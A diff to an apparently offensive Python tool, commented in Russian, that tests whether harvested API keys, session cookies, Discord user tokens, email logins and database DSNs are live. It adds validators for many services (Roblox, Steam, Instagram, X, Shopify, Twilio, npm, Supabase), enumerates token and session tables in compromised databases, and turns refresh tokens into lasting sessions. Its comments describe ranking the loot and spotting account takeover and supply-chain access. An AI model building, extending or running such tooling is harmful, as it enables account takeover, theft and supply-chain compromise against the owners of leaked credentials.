+                "origin": "direct",
+                "ts": time.time(),
+                "models": [],
+                "n_models": 0,
+                "stars_listed": [],
+                "stars_working": [],
+                "balance": None,
+                "tier": "Google AI Studio (403: restricted или API off)",
+                "usage": None,
+                "embed": None,
+                "rerank": None,
+                "status": "listed_only",
+                "note": "403: рестрикция/выключен API — ключ, вероятно, живой",
+            }
         if r.status_code == 429:
             # rate limit = ключ ВАЛИДЕН
             return {
@@ -7831,7 +9561,9 @@ def _oat01_tier(key):
             return "free"
         return "dead"
     except Exception:
-        return "dead"
+        # АУДИТ-фикс: сетевой сбой ≠ "dead" — тир "REFRESH->dead" при живой
+        # сессии вводил в заблуждение. unknown = не знаем.
+        return "unknown"
 
 
 def validate_sid01(key):
@@ -8005,7 +9737,7 @@ def validate_aws(key, origin=None):
     import hashlib
     import hmac as hmac_mod
 
-    m = re.match(r"(AKIA[0-9A-Z]{16})[\s\"':=a-zA-Z_]{1,50}([A-Za-z0-9/+=]{40})", key)
+    m = re.match(r"(AKIA[0-9A-Z]{16})[\s\"':=,;a-zA-Z_]{1,50}([A-Za-z0-9/+=]{40})", key)
     if not m:
         return None
     ak, sk = m.group(1), m.group(2)
@@ -8414,6 +10146,387 @@ def validate_gitlab(key):
                 "rerank": None,
                 "status": "working",
             }
+    except Exception:
+        pass
+    return None
+
+
+def _simple_rec(key, base, tag, tier, status="working"):
+    return {
+        "key": key,
+        "base": base,
+        "tag": tag,
+        "origin": "direct",
+        "ts": time.time(),
+        "models": [],
+        "n_models": 0,
+        "stars_listed": [],
+        "stars_working": [],
+        "balance": None,
+        "tier": tier,
+        "usage": None,
+        "embed": None,
+        "rerank": None,
+        "status": status,
+    }
+
+
+def validate_elevenlabs(key):
+    """ElevenLabs (xi-api-key): GET /v1/user — 200 = живой голосовой акк,
+    в ответе subscription: tier/character_count. АУДИТ-фикс: тег падал в
+    generic-путь (там Bearer на /models) и живые ключи умирали как 401."""
+    try:
+        r = http(
+            "GET",
+            "https://api.elevenlabs.io/v1/user",
+            timeout=(8, 15),
+            headers={"xi-api-key": str(key), "User-Agent": "kh"},
+        )
+        if r is not None and r.status_code == 200:
+            j = r.json()
+            sub = j.get("subscription") or {}
+            tier_name = sub.get("tier") or "?"
+            chars = sub.get("character_count")
+            limit = sub.get("character_limit")
+            return _simple_rec(
+                key,
+                "https://api.elevenlabs.io/v1",
+                "elevenlabs",
+                "ELEVENLABS LIVE [%s]: %s/%s chars — голосовой синтез/клонинг"
+                % (tier_name, chars, limit),
+            )
+        if r is not None and r.status_code == 401:
+            return None  # точный вердикт
+    except Exception:
+        pass
+    return None
+
+
+def validate_huggingface(key):
+    """HF token (hf_...): whoami-v2 — 200 = живой токен, в ответе юзер/орги/
+    доступ к gated-моделям. АУДИТ-фикс: generic-путь слал ключ на
+    api-inference.../v1/chat/completions — живые hf_ умирали впустую."""
+    try:
+        r = http(
+            "GET",
+            "https://huggingface.co/api/whoami-v2",
+            timeout=(8, 15),
+            headers={"Authorization": "Bearer " + str(key), "User-Agent": "kh"},
+        )
+        if r is not None and r.status_code == 200:
+            j = r.json()
+            name = j.get("name") or "?"
+            orgs = [o.get("name") for o in (j.get("orgs") or []) if isinstance(o, dict)]
+            fine = ""
+            if j.get("type") == "user":
+                fine = " (user token)"
+            if j.get("canPay"):
+                fine += " | 💳canPay"
+            return _simple_rec(
+                key,
+                "https://huggingface.co",
+                "huggingface",
+                "HF LIVE: @%s%s | орги: %s" % (name, fine, ", ".join(orgs[:5]) or "—"),
+            )
+        if r is not None and r.status_code == 401:
+            return None
+    except Exception:
+        pass
+    return None
+
+
+def validate_perplexity(key):
+    """Perplexity (pplx-...): боевой чат sonar — 200 = PRO-тариф живой.
+    АУДИТ-фикс: generic-путь пробовал gpt-4o-mini — pplx его не знает."""
+    try:
+        r = http(
+            "POST",
+            "https://api.perplexity.ai/chat/completions",
+            timeout=(10, 30),
+            headers={
+                "Authorization": "Bearer " + str(key),
+                "Content-Type": "application/json",
+            },
+            json_body={
+                "model": "sonar",
+                "max_tokens": 4,
+                "messages": [{"role": "user", "content": "hi"}],
+            },
+        )
+        if r is not None and r.status_code == 200:
+            return _simple_rec(
+                key,
+                "https://api.perplexity.ai",
+                "perplexity",
+                "PERPLEXITY LIVE (sonar чат отвечает)",
+            )
+        if r is not None and r.status_code == 429:
+            return _simple_rec(
+                key,
+                "https://api.perplexity.ai",
+                "perplexity",
+                "Perplexity: rate-limited (ключ валиден, квота жирная)",
+                status="no_balance",
+            )
+        if r is not None and r.status_code == 401:
+            return None
+    except Exception:
+        pass
+    return None
+
+
+def validate_jina(key):
+    """Jina AI (jina_...): POST /v1/embeddings — 200 = живой (эмбеддинги/
+    rerank/reader). АУДИТ-фикс: generic chat-проба на jina бессмысленна."""
+    try:
+        r = http(
+            "POST",
+            "https://api.jina.ai/v1/embeddings",
+            timeout=(8, 20),
+            headers={
+                "Authorization": "Bearer " + str(key),
+                "Content-Type": "application/json",
+            },
+            json_body={"model": "jina-embeddings-v3", "input": ["hi"]},
+        )
+        if r is not None and r.status_code == 200:
+            return _simple_rec(
+                key,
+                "https://api.jina.ai",
+                "jina",
+                "JINA LIVE (embeddings отвечают — reader/rerank тоже)",
+            )
+        if r is not None and r.status_code == 429:
+            return _simple_rec(
+                key,
+                "https://api.jina.ai",
+                "jina",
+                "Jina: rate-limited (валиден)",
+                status="no_balance",
+            )
+        if r is not None and r.status_code == 401:
+            return None
+    except Exception:
+        pass
+    return None
+
+
+def validate_voyage(key):
+    """Voyage AI: /v1/embeddings боевой пробой (chat-эндпоинта нет — generic
+    путь убивал живые ключи)."""
+    try:
+        r = http(
+            "POST",
+            "https://api.voyageai.com/v1/embeddings",
+            timeout=(8, 20),
+            headers={
+                "Authorization": "Bearer " + str(key),
+                "Content-Type": "application/json",
+            },
+            json_body={"model": "voyage-3", "input": ["hi"]},
+        )
+        if r is not None and r.status_code == 200:
+            return _simple_rec(
+                key,
+                "https://api.voyageai.com",
+                "voyage",
+                "VOYAGE LIVE (embeddings отвечают)",
+            )
+        if r is not None and r.status_code == 429:
+            return _simple_rec(
+                key,
+                "https://api.voyageai.com",
+                "voyage",
+                "Voyage: rate-limited (валиден)",
+                status="no_balance",
+            )
+        if r is not None and r.status_code == 401:
+            return None
+    except Exception:
+        pass
+    return None
+
+
+def validate_cloudflare(key):
+    """CF API token: /client/v4/user/tokens/verify — 200 = живой (потенциально
+    полный доступ к CDN/DNS/Workers аккаунта)."""
+    try:
+        r = http(
+            "GET",
+            "https://api.cloudflare.com/client/v4/user/tokens/verify",
+            timeout=(8, 15),
+            headers={"Authorization": "Bearer " + key, "User-Agent": "kh"},
+        )
+        if r is not None and r.status_code == 200:
+            j = r.json()
+            if (j.get("result") or {}).get("status") == "active":
+                return _simple_rec(
+                    key,
+                    "https://api.cloudflare.com/client/v4",
+                    "cloudflare",
+                    "CF token ACTIVE (DNS/Workers/CDN доступ)",
+                )
+    except Exception:
+        pass
+    return None
+
+
+def validate_npm(key):
+    """npm token: /-/whoami — живой = паблиш от имени юзера (supply-chain)."""
+    try:
+        r = http(
+            "GET",
+            "https://registry.npmjs.org/-/whoami",
+            timeout=(8, 15),
+            headers={"Authorization": "Bearer " + key, "User-Agent": "kh"},
+        )
+        if r is not None and r.status_code == 200:
+            u = (r.json() or {}).get("username", "?")
+            return _simple_rec(
+                key,
+                "https://registry.npmjs.org",
+                "npm",
+                "npm @%s (publish-доступ)" % u,
+            )
+    except Exception:
+        pass
+    return None
+
+
+def validate_linear(key):
+    """Linear API key: GraphQL viewer — живой = чтение всей команды/исходников."""
+    try:
+        r = http(
+            "POST",
+            "https://api.linear.app/graphql",
+            timeout=(8, 15),
+            headers={"Authorization": key, "Content-Type": "application/json"},
+            json_body={"query": "{ viewer { id name email } }"},
+        )
+        if r is not None and r.status_code == 200:
+            v = ((r.json().get("data") or {}).get("viewer")) or {}
+            if v.get("id"):
+                return _simple_rec(
+                    key,
+                    "https://api.linear.app",
+                    "linear",
+                    "Linear %s <%s>" % (v.get("name", "?"), v.get("email", "?")),
+                )
+    except Exception:
+        pass
+    return None
+
+
+def validate_figma(key):
+    """Figma token: /v1/me — живой = чтение всех файлов команды."""
+    try:
+        r = http(
+            "GET",
+            "https://api.figma.com/v1/me",
+            timeout=(8, 15),
+            headers={"X-Figma-Token": key, "User-Agent": "kh"},
+        )
+        if r is not None and r.status_code == 200:
+            u = r.json()
+            return _simple_rec(
+                key,
+                "https://api.figma.com",
+                "figma",
+                "Figma %s <%s>" % (u.get("handle", "?"), u.get("email", "?")),
+            )
+    except Exception:
+        pass
+    return None
+
+
+def validate_twilio(key, origin):
+    """Twilio SK + Account SID (из того же куска текста): GET
+    api.twilio.com/2010-04-01/Accounts/{sid}.json basic-auth sid:token —
+    200 = LIVE (SMS/voice от имени акка), friendly_name + status.
+    Без SID — listed_only лид."""
+    skm = re.search(r"SK[0-9a-f]{32}", str(key))
+    acm = re.search(r"AC[0-9a-f]{32}", str(key))
+    if not skm:
+        return None
+    if not acm:
+        return _simple_rec(
+            skm.group(0),
+            "",
+            "twilio",
+            "Twilio API secret (нет Account SID рядом — лид)",
+            status="listed_only",
+        )
+    sid, tok = acm.group(0), skm.group(0)
+    try:
+        import base64 as _b
+
+        basic = _b.b64encode(("%s:%s" % (sid, tok)).encode()).decode()
+        r = http(
+            "GET",
+            "https://api.twilio.com/2010-04-01/Accounts/%s.json" % sid,
+            timeout=(8, 15),
+            headers={"User-Agent": "kh", "Authorization": "Basic " + basic},
+        )
+        if r is not None and r.status_code == 200:
+            j = r.json()
+            if j.get("status") in ("active", "suspended"):
+                return _simple_rec(
+                    "%s|%s" % (sid, tok),
+                    "https://api.twilio.com",
+                    "twilio",
+                    "TWILIO LIVE: %s [%s] — SMS/voice от имени аккаунта"
+                    % (j.get("friendly_name", "?"), j.get("status")),
+                )
+    except Exception:
+        pass
+    return None
+
+
+def validate_shopify(key, origin):
+    """Shopify shpat_/shpca_ + домен магазина: GET {shop}/admin/api/2024-01/
+    shop.json — 200 = LIVE: имя магазина, план, валюта, ДЕНЬГИ заказов."""
+    tm = re.search(r"(?:shpat|shpca|shpss)_[A-Za-z0-9]{32,}", str(key))
+    if not tm:
+        return None
+    tok = tm.group(0)
+    sm = re.search(r"([a-z0-9][a-z0-9\-]{2,60}\.myshopify\.com)", str(key))
+    if not sm:
+        return _simple_rec(
+            tok,
+            "",
+            "shopify",
+            "Shopify access token (нет домена myshopify.com рядом — лид)",
+            status="listed_only",
+        )
+    shop = sm.group(1)
+    try:
+        # АУДИТ-фикс: Shopify ретирит версии ~через 12 мес — зашитая 2024-01
+        # в 2026 отдаёт 404 и LIVE-токены умирали. Цепочка: первый не-404
+        # ответ решает (404 = версия мертва, а НЕ токен).
+        r = None
+        for _ver in ("2025-10", "2025-07", "2025-04", "2025-01", "unstable"):
+            r = http(
+                "GET",
+                "https://%s/admin/api/%s/shop.json" % (shop, _ver),
+                timeout=(8, 15),
+                headers={"X-Shopify-Access-Token": tok, "User-Agent": "kh"},
+            )
+            if r is not None and r.status_code != 404:
+                break
+        if r is not None and r.status_code == 200:
+            j = r.json().get("shop") or {}
+            if j.get("id"):
+                return _simple_rec(
+                    "%s @ %s" % (tok, shop),
+                    "https://" + shop,
+                    "shopify",
+                    "SHOPIFY LIVE: %s [%s, %s] — заказы/товары/выплаты"
+                    % (
+                        j.get("name", "?"),
+                        j.get("plan_display_name", "?"),
+                        j.get("currency", "?"),
+                    ),
+                )
     except Exception:
         pass
     return None
@@ -8834,8 +10947,12 @@ def validate_baseten(key, origin):
         )
         if r is None or r.status_code != 200:
             return None
+        # АУДИТ-фикс: m.get("id") бывает None — "Kimi" in None = TypeError
+        # -> внешний except -> живой ключ помечался мёртвым
         models = [
-            m.get("id") for m in (r.json().get("data") or []) if isinstance(m, dict)
+            str(m.get("id"))
+            for m in (r.json().get("data") or [])
+            if isinstance(m, dict) and m.get("id")
         ]
         kimi = [m for m in models if "Kimi" in m or "K3" in m]
         if not models:
@@ -9021,7 +11138,26 @@ def validate_email_cred(key, origin):
     if smtp_ok is not True and imap_host is None:
         if smtp_ok is False:
             return None  # AUTH отклонён и IMAP мёртв — мёртв
-        return None  # ни туда ни туда не достучались — не считаем живым
+        # АУДИТ-фикс: smtp_ok is None = СЕТЬ не достучалась (587 зарезан
+        # у нашего хоста, а не у ящика) — это НЕ смерть. unverified ->
+        # attempts-ретрай, а не вечный seen.
+        return {
+            "key": key,
+            "base": "smtp://%s" % (smtp_host or "?"),
+            "tag": "email-cred",
+            "origin": str(origin)[:200],
+            "ts": time.time(),
+            "models": [],
+            "n_models": 0,
+            "stars_listed": [],
+            "stars_working": [],
+            "balance": None,
+            "tier": "email (сеть не достучалась — ретрай)",
+            "usage": None,
+            "embed": None,
+            "rerank": None,
+            "status": "unverified",
+        }
     ato = bool(subs & {"anthropic", "claude"})
     via = "smtp://%s" % smtp_host if smtp_ok is True else "imap://%s" % imap_host
     return {
@@ -9108,6 +11244,16 @@ def validate_discord(key):
             timeout=(8, 15),
             headers={"Authorization": "Bot " + key},
         )
+        # АУДИТ-фикс: паттерн ловит и USER-токены (MTE.../MT... снежфлейк-
+        # base64) — с "Bot "-префиксом они 401 и живые юзер-токены умирали.
+        # Ретрай голым токеном: юзер-сессия (полный акк) даже жирнее бота.
+        if r is not None and r.status_code == 401:
+            r = http(
+                "GET",
+                "https://discord.com/api/v10/users/@me",
+                timeout=(8, 15),
+                headers={"Authorization": key},
+            )
         if r is not None and r.status_code == 200:
             u = r.json()
             return {
@@ -9247,6 +11393,15 @@ def validate_db_dsn(dsn, origin):
     dsn = re.sub(r"[?&]channel_binding=require", "", dsn)
     host_m = re.search(r"@([^/:]+)", dsn)
     host = host_m.group(1) if host_m else ""
+    # АУДИТ-фикс: libsql://host?authToken=... — БЕЗ "@": host пустой и
+    # валидные turso-DSN умирали на guard'е ниже не дойдя до своей ветки.
+    if not host and dsn.lower().startswith("libsql://"):
+        try:
+            from urllib.parse import urlsplit as _us
+
+            host = _us(dsn).hostname or ""
+        except Exception:
+            host = ""
     if not host or host in (
         "localhost",
         "127.0.0.1",
@@ -9317,6 +11472,25 @@ def validate_db_dsn(dsn, origin):
                 "WHERE table_schema NOT IN ('pg_catalog','information_schema'))"
             )
             u, db, ntab = cur.fetchone()
+            if ntab == 0:
+                # ПУСТАЯ база — логин живой, но ценности ноль. return None ->
+                # seen-дедуп: никогда больше не валидируем и не постим
+                # (Doccano-пустышка 2026-09-10 спамила TG)
+                conn.close()
+                return None
+            # интересные таблицы в тир: auth/tokens/sessions — сразу видно,
+            # где жир (authtoken_token = API-ключи юзеров, django_session...)
+            interesting = []
+            try:
+                cur.execute(
+                    "SELECT table_name FROM information_schema.tables "
+                    "WHERE table_schema NOT IN ('pg_catalog','information_schema') "
+                    "AND table_name ~* 'user|token|session|api_key|auth|account|"
+                    "secret|cred|key' ORDER BY table_name LIMIT 8"
+                )
+                interesting = [r[0] for r in cur.fetchall()]
+            except Exception:
+                pass
         elif scheme == "mysql":
             try:
                 import pymysql
@@ -9328,12 +11502,15 @@ def validate_db_dsn(dsn, origin):
             _kw = {}
             if scheme_raw == "pscale":
                 _kw["ssl"] = {"check_hostname": False}  # planetscale: TLS only
+            # АУДИТ-фикс: pscale-DSN вида .../db?sslaccept=strict — query из
+            # path не отрезался -> pymysql падал -> валидный DSN умирал.
+            _dbname = (uo.path or "/").lstrip("/").split("?")[0]
             conn = pymysql.connect(
                 host=uo.hostname,
                 port=uo.port or 3306,
                 user=uo.username,
                 password=uo.password or "",
-                database=(uo.path or "/").lstrip("/"),
+                database=_dbname,
                 connect_timeout=6,
                 **_kw,
             )
@@ -9446,8 +11623,16 @@ def validate_db_dsn(dsn, origin):
             "stars_listed": [],
             "stars_working": [],
             "balance": None,
-            "tier": "DB LOGIN %s@%s/%s (%s таблиц)"
-            % (u, host, db, ntab if ntab >= 0 else "?"),
+            "tier": "DB LOGIN %s@%s/%s (%s таблиц%s)"
+            % (
+                u,
+                host,
+                db,
+                ntab if ntab >= 0 else "?",
+                (": " + ", ".join(interesting[:6]))
+                if (scheme == "postgres" and interesting)
+                else "",
+            ),
             "usage": None,
             "embed": None,
             "rerank": None,
@@ -9511,7 +11696,7 @@ def validate_gcookie(cookies, origin):
             pass
         cid = hashlib.sha1(cookies.encode()).hexdigest()[:12]
         pool[cid] = {"cookies": cookies, "ts": time.time()}
-        json.dump(pool, open(GCOOKIE_POOL_PATH, "w", encoding="utf-8"))
+        _atomic_json_dump(GCOOKIE_POOL_PATH, pool)
     except Exception:
         pass
     return {
@@ -9531,6 +11716,350 @@ def validate_gcookie(cookies, origin):
         "rerank": None,
         "status": "working",
     }
+
+
+def _sess_rec(key, base, tag, tier, origin):
+    # АУДИТ-фикс: ключ храним ПОЛНЫМ (было: обрезка на 500 симв с "…" —
+    # Roblox-куки ~900 chars сохранялись в неюзабельном виде: стор
+    # уничтожал именно то, что поймал). Усечение — только при рендере.
+    return {
+        "key": key,
+        "base": base,
+        "tag": tag,
+        "origin": str(origin)[:200],
+        "ts": time.time(),
+        "models": [],
+        "n_models": 0,
+        "stars_listed": [],
+        "stars_working": [],
+        "balance": None,
+        "tier": tier,
+        "usage": None,
+        "embed": None,
+        "rerank": None,
+        "status": "working",
+    }
+
+
+def validate_roblox(cookie, origin):
+    """.ROBLOSECURITY: users.roblox.com/v1/users/authenticated — 200 JSON с
+    id/name = живая сессия (ROBUX/предметы). Мёртвая = 401."""
+    ck = str(cookie).strip()
+    if "\t" in ck:
+        parts = ck.split("\t")
+        ck = "%s=%s" % (parts[-2], parts[-1])
+    if not ck.startswith(".ROBLOSECURITY="):
+        m = re.search(r"\.ROBLOSECURITY=[^\s;]{20,}", ck)
+        ck = m.group(0) if m else ck
+    try:
+        r = http(
+            "GET",
+            "https://users.roblox.com/v1/users/authenticated",
+            timeout=(8, 15),
+            headers={"Cookie": ck, "User-Agent": UA["User-Agent"]},
+        )
+        if r is not None and r.status_code == 200:
+            j = r.json()
+            if j.get("id"):
+                return _sess_rec(
+                    ck,
+                    "https://www.roblox.com",
+                    "roblox",
+                    "ROBLOX LIVE: %s (id %s) — ROBUX/предметы"
+                    % (j.get("name", "?"), j.get("id")),
+                    origin,
+                )
+    except Exception:
+        pass
+    return None
+
+
+def validate_steam(cookie, origin):
+    """steamLoginSecure: store.steampowered.com/account/ — залогинен = email
+    аккаунта в теле; мёртв = редирект на login."""
+    ck = str(cookie).strip()
+    if "\t" in ck:
+        parts = ck.split("\t")
+        ck = "%s=%s" % (parts[-2], parts[-1])
+    if not ck.startswith("steamLoginSecure="):
+        m = re.search(r"steamLoginSecure=[^\s;]{30,}", ck)
+        ck = m.group(0) if m else ck
+    try:
+        r = http(
+            "GET",
+            "https://store.steampowered.com/account/",
+            timeout=(8, 15),
+            headers={"Cookie": ck, "User-Agent": UA["User-Agent"]},
+        )
+        if r is None or r.status_code != 200:
+            return None
+        if "login" in str(getattr(r, "url", "")).lower():
+            return None
+        body = (r.text or "").lower()
+        if "sign in" in body[:3000] and "account" not in body:
+            return None
+        # email аккаунта в <span class="account_name">/data-featuretarget
+        em = re.search(r"[\w.+-]+@[\w-]+\.[\w.]{2,}", r.text or "")
+        if "logout" not in body and "account" not in body:
+            return None
+        return _sess_rec(
+            ck,
+            "https://store.steampowered.com",
+            "steam",
+            "STEAM LIVE%s — игры/баланс/маркет" % (": " + em.group(0) if em else ""),
+            origin,
+        )
+    except Exception:
+        pass
+    return None
+
+
+def validate_instagram(cookie, origin):
+    """instagram sessionid: /accounts/edit/ 200 = залогинен (редирект на
+    login = мертва). Достаём username из страницы."""
+    ck = str(cookie).strip()
+    if "\t" in ck:
+        parts = ck.split("\t")
+        ck = "%s=%s" % (parts[-2], parts[-1])
+    if "sessionid=" not in ck:
+        m = re.search(r"sessionid=[^\s;]{20,}", ck)
+        ck = m.group(0) if m else ck
+    try:
+        r = http(
+            "GET",
+            "https://www.instagram.com/accounts/edit/",
+            timeout=(8, 15),
+            headers={"Cookie": ck, "User-Agent": UA["User-Agent"]},
+        )
+        if r is None or r.status_code != 200:
+            return None
+        if "login" in str(getattr(r, "url", "")).lower():
+            return None
+        body = r.text or ""
+        if '"username"' not in body and "accounts/edit" not in str(
+            getattr(r, "url", "")
+        ):
+            return None
+        um = re.search(r'"username"\s*:\s*"([^"]{1,40})"', body)
+        return _sess_rec(
+            ck,
+            "https://www.instagram.com",
+            "instagram",
+            "INSTAGRAM LIVE%s" % (": @" + um.group(1) if um else ""),
+            origin,
+        )
+    except Exception:
+        pass
+    return None
+
+
+def validate_xtwitter(cookie, origin):
+    """X auth_token (+ct0 если есть): api.x.com/1.1/account/settings.json —
+    200 = живая сессия. Без ct0 тоже пробуем: cookie-only иногда проходит."""
+    ck = str(cookie).strip()
+    if "\t" in ck:
+        parts = ck.split("\t")
+        ck = "%s=%s" % (parts[-2], parts[-1])
+    if "auth_token=" not in ck:
+        m = re.search(r"auth_token=[0-9a-f]{40}", ck)
+        ck = m.group(0) if m else ck
+    ct0 = ""
+    m0 = re.search(r"ct0=([0-9a-f]{20,})", str(cookie))
+    if m0:
+        ct0 = m0.group(1)
+    try:
+        h = {"Cookie": ck, "User-Agent": UA["User-Agent"]}
+        if ct0:
+            h["x-csrf-token"] = ct0
+            h["Cookie"] = ck + "; ct0=" + ct0
+        r = http(
+            "GET",
+            "https://api.x.com/1.1/account/settings.json",
+            timeout=(8, 15),
+            headers=h,
+        )
+        if r is not None and r.status_code == 200:
+            sn = (r.json() or {}).get("screen_name")
+            if sn:
+                return _sess_rec(
+                    h["Cookie"],
+                    "https://x.com",
+                    "x-session",
+                    "X/TWITTER LIVE: @%s" % sn,
+                    origin,
+                )
+    except Exception:
+        pass
+    return None
+
+
+def validate_cursor_web(key, origin):
+    """Cursor WorkosCursorSessionToken — это JWT: декодим, проверяем exp,
+    достаём email. Офлайн-проверка (как jwt-тег, но с тиром подписки)."""
+    tok = str(key).strip()
+    m = re.search(r"WorkosCursorSessionToken=(eyJ[A-Za-z0-9_\-.]+)", tok)
+    if not m:
+        return None
+    tok = m.group(1)
+    try:
+        import base64 as _b
+
+        part = tok.split(".")[1]
+        part += "=" * (-len(part) % 4)
+        claims = json.loads(_b.urlsafe_b64decode(part.encode()))
+    except Exception:
+        return None
+    exp = int(claims.get("exp") or 0)
+    email = claims.get("email") or claims.get("sub") or "?"
+    left_h = (exp - time.time()) / 3600 if exp else 0
+    if exp and exp < time.time():
+        return None  # протух
+    return {
+        "key": tok,
+        "base": "https://www.cursor.com",
+        "tag": "cursor-web",
+        "origin": str(origin)[:200],
+        "ts": time.time(),
+        "models": [],
+        "n_models": 0,
+        "stars_listed": [],
+        "stars_working": [],
+        "balance": None,
+        "tier": "CURSOR WEB SESSION: %s (exp через %.0fч)" % (email, left_h),
+        "usage": None,
+        "embed": None,
+        "rerank": None,
+        "status": "working",
+    }
+
+
+def validate_supabase_auth(key, origin):
+    """sb-<ref>-auth-token cookie: JSON/base64 {access_token, refresh_token}.
+    Живая = POST {supabase-url}/auth/v1/token?grant_type=refresh_token с
+    anon-ключом из access_token -> 200 + свежий access (вечная сессия)."""
+    raw = str(key).strip()
+    m = re.search(r"sb-([a-z0-9]{15,25})-auth-token(?:\.0)?=(.+)", raw)
+    if not m:
+        return None
+    val = htmllib.unescape(m.group(2)).strip()
+    try:
+        from urllib.parse import unquote as _uq
+
+        val = _uq(val)
+    except Exception:
+        pass
+    if val.startswith("base64-"):
+        import base64 as _b
+
+        try:
+            val = _b.b64decode(val[7:] + "=" * (-len(val[7:]) % 4)).decode(
+                "utf-8", "replace"
+            )
+        except Exception:
+            return None
+    try:
+        j = json.loads(val)
+    except Exception:
+        return None
+    at = j.get("access_token") or ""
+    rt = j.get("refresh_token") or ""
+    if not at or not rt:
+        return None
+    # supabase URL + anon-key из JWT (iss + sub claims)
+    try:
+        import base64 as _b
+
+        part = at.split(".")[1]
+        part += "=" * (-len(part) % 4)
+        claims = json.loads(_b.urlsafe_b64decode(part.encode()))
+        iss = str(claims.get("iss") or "")
+        supa_url = iss.replace("/auth/v1", "") if "/auth/v1" in iss else ""
+        if not supa_url.startswith("http"):
+            return None
+    except Exception:
+        return None
+    try:
+        r = http(
+            "POST",
+            supa_url + "/auth/v1/token?grant_type=refresh_token",
+            timeout=(8, 15),
+            headers={
+                "apikey": at,
+                "Authorization": "Bearer " + at,
+                "Content-Type": "application/json",
+            },
+            json_body={"refresh_token": rt},
+        )
+        if r is not None and r.status_code == 200:
+            jj = r.json()
+            new_at = jj.get("access_token") or ""
+            email = (jj.get("user") or {}).get("email") or claims.get("email") or "?"
+            if new_at:
+                return {
+                    "key": "%s|refresh_token=%s" % (raw, rt),
+                    "base": supa_url,
+                    "tag": "supabase-auth",
+                    "origin": str(origin)[:200],
+                    "ts": time.time(),
+                    "models": [],
+                    "n_models": 0,
+                    "stars_listed": [],
+                    "stars_working": [],
+                    "balance": None,
+                    "tier": "SUPABASE AUTH LIVE: %s (refresh работает — вечная сессия)"
+                    % email,
+                    "usage": None,
+                    "embed": None,
+                    "rerank": None,
+                    "status": "working",
+                }
+    except Exception:
+        pass
+    return None
+
+
+def validate_supabase_mgmt(key, origin):
+    """Supabase Management API token (sbp_<40 hex>): GET
+    api.supabase.com/v1/projects Bearer -> 200 = LIVE: список проектов орга
+    (БД/стораджи/edge-функции — полный контроль над бэкендами).
+    АУДИТ-фикс: тег "supabase" раньше падал в generic-путь с ПУСТЫМИ базами
+    -> return None без единого запроса -> токен умирал непроверенным."""
+    m = re.search(r"sbp_[a-f0-9]{40}", str(key))
+    if not m:
+        return None
+    tok = m.group(0)
+    try:
+        r = http(
+            "GET",
+            "https://api.supabase.com/v1/projects",
+            timeout=(8, 15),
+            headers={"Authorization": "Bearer " + tok, "User-Agent": "kh"},
+        )
+        if r is not None and r.status_code == 200:
+            projs = r.json() or []
+            names = [
+                str(p.get("name") or p.get("ref") or "?")[:24]
+                for p in projs[:6]
+                if isinstance(p, dict)
+            ]
+            return _simple_rec(
+                tok,
+                "https://api.supabase.com",
+                "supabase",
+                "SUPABASE MGMT LIVE: %d проектов (%s) — БД/сторадж/функции орга"
+                % (len(projs), ", ".join(names) or "?"),
+            )
+        if r is not None and r.status_code in (401, 403):
+            return None  # точный auth-вердикт: токен мёртв
+    except Exception:
+        pass
+    return _simple_rec(
+        tok,
+        "https://api.supabase.com",
+        "supabase",
+        "Supabase mgmt token (сеть флакнула — не проверен)",
+        status="listed_only",
+    )
 
 
 # --------------------------------------------------------- КУКИ-ВОЛНА (websess)
@@ -9665,11 +12194,13 @@ def validate_websess(cookie, origin):
         return None
     if PLACEHOLDER_SUBSTR_RE.search(cookie) or JUNKY_KEY_RE.search(cookie):
         return None
-    if len(cookie) > 2000:
-        return None
-    # netscape-файл: построчные куки, домен-ориентированный реплей
+    # АУДИТ-фикс: length-guard стоял ДО netscape-ветки — многострочные
+    # cookies.txt-дампы (>2000 симв — норма для джаров) отбрасывались
+    # не глядя. Netscape обрабатываем первым, лимит — для одиночных куков.
     if "\t" in cookie:
         return _websess_netscape(cookie, origin)
+    if len(cookie) > 2000:
+        return None
     m = re.match(r"([A-Za-z0-9_.\-]{1,40})=", cookie)
     cname = (m.group(1) if m else "").lower()
     if not cname:
@@ -9728,8 +12259,9 @@ def validate_websess(cookie, origin):
         r0 = _websess_get(base + "/", cookie)
         if r0 is None:
             continue  # схема мертва — пробуем вторую
+        pre = {"/": r0}  # "/" уже сфетчен — не дублируем запрос
         for path in ("/", "/admin", "/dashboard", "/api/user", "/user", "/home"):
-            r = _websess_get(base + path, cookie)
+            r = pre[path] if path in pre else _websess_get(base + path, cookie)
             if r is None or r.status_code != 200 or len(r.text) < 300:
                 continue
             body = r.text
@@ -9918,19 +12450,39 @@ def validate_github_token(key):
         return None
     copilot = False
     try:
-        rc = http(
+        # ПРАВИЛЬНЫЙ флоу (было: raw gh-токен на api.githubcopilot.com = всегда
+        # 401, sweep находил ноль): сначала обмен на copilot-сессию.
+        # /copilot_internal/v2/token 200 только при ЖИВОЙ подписке Copilot.
+        rt = http(
             "GET",
-            "https://api.githubcopilot.com/models",
+            "https://api.github.com/copilot_internal/v2/token",
             timeout=(6, 15),
             headers={
                 "Authorization": "Bearer " + key,
+                "Accept": "application/vnd.github+json",
                 "Editor-Version": "vscode/1.95.0",
-                "Editor-Plugin-Version": "copilot-chat/0.26.0",
-                "Copilot-Integration-Id": "vscode-chat",
-                "User-Agent": "GitHubCopilotChat/0.26.0",
             },
         )
-        copilot = rc.status_code == 200
+        ctok = None
+        if rt is not None and rt.status_code == 200:
+            try:
+                ctok = (rt.json() or {}).get("token")
+            except Exception:
+                ctok = None
+        if ctok:
+            rc = http(
+                "GET",
+                "https://api.githubcopilot.com/models",
+                timeout=(6, 15),
+                headers={
+                    "Authorization": "Bearer " + ctok,
+                    "Editor-Version": "vscode/1.95.0",
+                    "Editor-Plugin-Version": "copilot-chat/0.26.0",
+                    "Copilot-Integration-Id": "vscode-chat",
+                    "User-Agent": "GitHubCopilotChat/0.26.0",
+                },
+            )
+            copilot = rc is not None and rc.status_code == 200
     except Exception:
         pass
     return {
@@ -10258,9 +12810,23 @@ def validate(key, base_hint, tag, origin):
     if tag == "slack":
         return validate_slack(key, origin)
     if tag == "anthropic-admin":
-        return validate_ort01(key)  # админ-ключи: пока не минтятся, но пробуем
+        # АУДИТ-фикс: sk-ant-admin01 — это НЕ refresh_token: отправка в
+        # validate_ort01 -> гарантированный 400 -> None -> seen-дедуп ->
+        # админ-ключ терялся НАВСЕГДА. Удалённой проверки у admin01 нет
+        # (Admin API требует org-id) — сохраняем как жирный лид.
+        return _simple_rec(
+            key,
+            "https://api.anthropic.com",
+            tag,
